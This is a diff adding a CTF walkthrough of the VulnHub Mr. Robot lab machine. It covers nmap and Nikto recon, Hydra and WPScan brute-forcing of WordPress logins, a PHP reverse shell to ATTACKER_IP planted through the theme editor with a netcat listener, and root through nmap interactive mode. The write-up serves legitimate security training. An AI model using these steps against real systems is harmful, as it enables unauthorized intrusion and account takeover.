@@ -1,112 +1,335 @@
+# 🤖 Mr. Robot: VulnHub — Writeup
 ```text
-██████╗ ███████╗███╗   ██╗████████╗███████╗███████╗████████╗
-██╔══██╗██╔════╝████╗  ██║╚══██╔══╝██╔════╝██╔════╝╚══██╔══╝
-██████╔╝█████╗  ██╔██╗ ██║   ██║   █████╗  ███████╗   ██║   
-██╔═══╝ ██╔══╝  ██║╚██╗██║   ██║   ██╔══╝  ╚════██║   ██║   
-██║     ███████╗██║ ╚████║   ██║   ███████╗███████║   ██║   
-╚═╝     ╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚══════╝   ╚═╝   
+███╗   ███╗██████╗     ██████╗  ██████╗ ██████╗  ██████╗ ████████╗
+████╗ ████║██╔══██╗    ██╔══██╗██╔═══██╗██╔══██╗██╔═══██╗╚══██╔══╝
+██╔████╔██║██████╔╝    ██████╔╝██║   ██║██████╔╝██║   ██║   ██║   
+██║╚██╔╝██║██╔══██╗    ██╔══██╗██║   ██║██╔══██╗██║   ██║   ██║   
+██║ ╚═╝ ██║██║  ██║    ██║  ██║╚██████╔╝██████╔╝╚██████╔╝   ██║   
+╚═╝     ╚═╝╚═╝  ╚═╝    ╚═╝  ╚═╝ ╚═════╝ ╚═════╝  ╚═════╝    ╚═╝   
+```
+![OS](https://img.shields.io/badge/OS-Linux-green)
+![Platform](https://img.shields.io/badge/Platform-VulnHub-red)
+![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange)
+![Theme](https://img.shields.io/badge/Theme-Mr.%20Robot-black)
+![Status](https://img.shields.io/badge/Flags-3%2F3-success)
+
+## 📌 Overview
+
+This repository contains a **full step-by-step penetration testing walkthrough** of the **Mr. Robot** vulnerable machine from VulnHub.
+The objective is to collect **3 flags** by exploiting misconfigurations, weak credentials, and privilege escalation paths.
+
+> ⚠️ **Educational Use Only** — This machine is intentionally vulnerable and must only be tested in a lab environment.
+
+---
+
+## 🧠 Lab Setup
+
+| Item           | Value               |
+| -------------- | ------------------- |
+| Target Machine | Mr. Robot (VulnHub) |
+| Attacker       | Kali Linux          |
+| Network Mode   | Host-only / NAT     |
+| Goal           | Capture all 3 keys  |
+
+---
+
+## 🔍 Phase 1: Network Reconnaissance
+
+### 1️⃣ Identify Local IP & Range
+
+```bash
+ifconfig
 ```
 
-<p align="center">
-  <b>Hands-on penetration testing portfolio</b><br>
-  VulnHub • TryHackMe • Hack The Box (and......other one's as well)
-</p>
+This reveals the attacker's IP and subnet range:
 
-<p align="center">
-  <img src="https://img.shields.io/badge/Focus-Just%20Hack-red" />
-  <img src="https://img.shields.io/badge/Level-Entry%20%2F%20Junior-orange" />
-  <img src="https://img.shields.io/badge/Status-Actively%20Learning-success" />
-</p>
-
----
-
-## 🧠 About This Repository
-
-This repository is my **personal penetration testing portfolio**.
-
-It contains **detailed, hands-on writeups** of intentionally vulnerable lab machines. Each walkthrough documents not just *what* worked, but *why* it worked — including failed attempts, clues, and decision-making.
-
-All work here is performed in **legal lab environments only**.
-
----
-
-## 🗂️ Repository Structure
-
-This repository uses **branches** to keep each machine isolated and clean.
-
-```text
-main        → Portfolio overview (you are here)
-matrix      → VulnHub: Matrix writeup
-steplar-1   → VulnHub: Steplar 1 writeup
+```
+192.168.xxx.xxx/24
 ```
 
-💊 **The truth lies beyond this branch.**
-Switch branches to enter individual writeups.
-
 ---
 
-## 🧪 What Each Writeup Includes
+### 2️⃣ Discover Live Hosts
 
-Every machine follows a consistent professional structure:
-
-* 🔍 Reconnaissance & Enumeration
-* 🌐 Web & Service Analysis
-* 🔐 Exploitation Techniques
-* ⬆️ Privilege Escalation
-* 🏁 Root / Flag Discovery
-* ⚠️ Ethical & Legal Disclaimer
-
-This mirrors real-world penetration testing methodology.
-
----
-
-## 🛠️ Tools & Techniques
-
-```text
-Nmap • Gobuster • FFUF • Nikto • Hydra • WPScan
-Metasploit • msfvenom • Netcat • Linux PrivEsc
+```bash
+netdiscover -i eth0
 ```
 
-Along with:
+This scans the local network and identifies connected devices.
 
-* Encoding & obfuscation analysis
-* Web application exploitation
-* Credential attacks
-* Kernel & misconfiguration privilege escalation
+📸 *Screenshot: netdiscover output*
 
 ---
 
-## 🎯 Skills Demonstrated
+### 3️⃣ Port Scanning (Nmap)
 
-* Network & service enumeration
-* Web application testing
-* Linux privilege escalation
-* Exploit research & adaptation
-* Clear technical documentation
-* Ethical hacking practices
+```bash
+nmap -sS -T4 192.168.xxx.xxx
+```
 
----
+Results show an active **HTTP service**, indicating a web-based target.
 
-## 📌 How to Navigate
-
-1. Click the **branch selector** (top-left on GitHub)
-2. Choose a machine name
-3. Open `README.md`
-4. Follow the walkthrough from recon to root
+📸 *Screenshot: nmap scan*
 
 ---
 
-## ⚠️ Legal Disclaimer
+## 🌐 Phase 2: Web Enumeration
 
-All content in this repository is created **strictly for educational purposes**.
+### 4️⃣ Manual Web Inspection
 
-These machines are designed to be vulnerable and are hosted in controlled lab environments such as VulnHub, TryHackMe, and Hack The Box (retired machines).
+Opening the target IP in the browser displays a **Mr. Robot themed website**.
 
-🚫 **Do not attempt these techniques on systems you do not own or have explicit permission to test.**
+📸 *Screenshot: Web interface*
+
+---
+
+### 5️⃣ Vulnerability Scanning with Nikto
+
+```bash
+nikto -h 192.168.xxx.xxx
+```
+
+Nikto identifies:
+
+* Use of **WordPress**
+* Presence of **robots.txt**
+
+📸 *Screenshot: Nikto scan*
+
+---
+
+### 6️⃣ robots.txt Enumeration (🚩 Flag 1)
+
+Navigate to:
+
+```
+http://TARGET_IP/robots.txt
+```
+
+Contents reveal:
+
+* `fsocity.dic` (dictionary file)
+* `key-1-of-3.txt`
+
+Download both:
+
+```bash
+wget http://TARGET_IP/fsocity.dic
+wget http://TARGET_IP/key-1-of-3.txt
+```
+
+View the first flag:
+
+```bash
+cat key-1-of-3.txt
+```
+
+🚩 **First flag captured**
+
+---
+
+## 📁 Phase 3: Dictionary Preparation
+
+The dictionary contains many duplicates. Clean it using:
+
+```bash
+cat fsocity.dic | sort -u > tfsocity
+```
+
+This optimized list will be used for brute-forcing.
+
+---
+
+## 🔐 Phase 4: WordPress User Enumeration
+
+### 7️⃣ Access WordPress Login
+
+```
+http://TARGET_IP/wp-login.php
+```
+
+---
+
+### 8️⃣ Intercept Login with Burp Suite
+
+Steps:
+
+1. Open Burp Suite → Proxy → Intercept ON
+2. Set browser proxy:
+
+   * HTTP: `127.0.0.1:8080`
+   * SOCKS5: `127.0.0.1:9050`
+3. Load wp-login page
+4. Enable intercept **after page loads**
+5. Submit dummy credentials
+
+📸 *Screenshot: Burp intercepted request*
+
+Captured parameters:
+
+```
+log=USERNAME&pwd=PASSWORD&wp-submit=Log+In
+```
+
+---
+
+## 🧨 Phase 5: Username Bruteforce (Hydra)
+
+```bash
+hydra -V -L tfsocity -p 123 TARGET_IP http-post-form \
+"/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username"
+```
+
+Result:
+
+```
+[80][http-post-form] host: TARGET_IP   login: Elliot   password: 123
+```
+
+✅ **Valid username found: Elliot**
+
+---
+
+## 🔑 Phase 6: Password Bruteforce (WPScan)
+
+Disable proxy and run:
+
+```bash
+wpscan --url http://TARGET_IP \
+--usernames Elliot \
+--passwords tfsocity
+```
+
+WPScan successfully reveals the password.
+
+📸 *Screenshot: WPScan credentials*
+
+Login to WordPress Admin.
+
+---
+
+## 🐚 Phase 7: Reverse Shell via WordPress
+
+### 9️⃣ PHP Reverse Shell
+
+* Download PentestMonkey PHP reverse shell
+* Update IP & port
+
+```php
+$ip = 'ATTACKER_IP';
+$port = 1234;
+```
+
+---
+
+### 🔁 Inject via Theme Editor
+
+Path:
+
+```
+Appearance → Theme Editor → 404.php
+```
+
+Replace file content with reverse shell code.
+
+---
+
+### 🔊 Listener
+
+```bash
+nc -lvnp 1234
+```
+
+Trigger shell:
+
+```bash
+curl http://TARGET_IP/404.php
+```
+
+✅ Reverse shell obtained.
+
+---
+
+## 🚩 Phase 8: Second Flag
+
+Navigate:
+
+```bash
+cd /home/robot
+ls
+```
+
+Files found:
+
+* `key-2-of-3.txt`
+* `password.raw-md5`
+
+Crack hash via CrackStation → obtain password.
+
+Switch user:
+
+```bash
+python -c 'import pty; pty.spawn("/bin/bash")'
+su robot
+```
+
+```bash
+cat key-2-of-3.txt
+```
+
+🚩 **Second flag captured**
+
+---
+
+## ⬆️ Phase 9: Privilege Escalation (Final Flag)
+
+### 🔓 Nmap Interactive Mode
+
+```bash
+nmap --interactive
+```
+
+Inside prompt:
+
+```bash
+!sh
+```
+
+Root shell spawned.
+
+---
+
+### 🚩 Flag 3
+
+```bash
+cd /root
+cat key-3-of-3.txt
+```
+
+🚩 **Third and final flag captured**
+
+---
+
+## 🏁 Conclusion
+
+This machine demonstrates:
+
+* Network enumeration
+* Web exploitation
+* WordPress attacks
+* Credential brute-forcing
+* Reverse shells
+* Privilege escalation
+
+A solid beginner-to-intermediate CTF.
 
 ---
 
 ## 👤 Author
 
 **Jai Agrawal**
-Cybersecurity | Penetration Testing | CTFs
+Cybersecurity • Penetration Testing • CTF Player
+
+---
+
+⚠️ *For educational purposes only.*
